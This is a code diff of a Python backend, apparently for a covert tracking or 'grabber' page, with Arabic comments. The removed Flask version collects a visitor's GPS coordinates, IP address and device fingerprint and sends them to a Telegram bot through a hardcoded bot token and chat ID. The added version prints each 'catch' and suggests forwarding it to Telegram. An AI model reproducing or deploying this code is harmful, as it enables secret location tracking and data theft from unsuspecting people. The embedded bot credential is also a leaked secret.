@@ -1,34 +1,21 @@
-from flask import Flask, request, jsonify
-import requests
+from http.server import BaseHTTPRequestHandler
+import json
 
-app = Flask(__name__)
-
-TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
-CHAT_ID = "5811700860"
-
-@app.route('/api/index', methods=['POST'])
-def handler():
-    try:
-        data = request.json
-        info = data.get('device_info', {})
-        lat = data.get('lat')
-        lon = data.get('lon')
-        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-
-        msg = f"🛡 **صيد تقني دقيق**\n\n"
-        msg += f"🆔 **HW-ID:** `{info.get('hw_id')}`\n"
-        msg += f"📱 **الجهاز:** `{info.get('model')}`\n"
-        msg += f"📏 **الشاشة:** `{info.get('screen')}`\n"
-        msg += f"🎮 **GPU:** `{info.get('gpu')}`\n"
-        msg += f"📶 **الشبكة:** `{info.get('network')}`\n"
-        msg += f"🔋 **البطارية:** `{info.get('battery')}`\n"
-        msg += f"🌐 **IP:** `{user_ip}`\n"
+class handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        # قراءة حجم البيانات القادمة
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
         
-        if lat and lon:
-            msg += f"\n📍 **الموقع:** [فتح الخريطة](https://www.google.com/maps?q={lat},{lon})"
-        
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-        return jsonify({"status": "ok"}), 200
-    except:
-        return jsonify({"status": "error"}), 500
+        # تحويل البيانات من JSON إلى قاموس بايثون
+        data = json.loads(post_data.decode('utf-8'))
+
+        # هنا "مربط الفرس" يا ياسر.. تقدر تطبع البيانات أو ترسلها لبوت تليجرام
+        print(f"--- صيدة جديدة من ALSSRY ---")
+        print(f"البيانات: {json.dumps(data, indent=2, ensure_ascii=False)}")
+
+        # الرد على المتصفح عشان ما يعلق العداد
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps({"status": "success"}).encode())
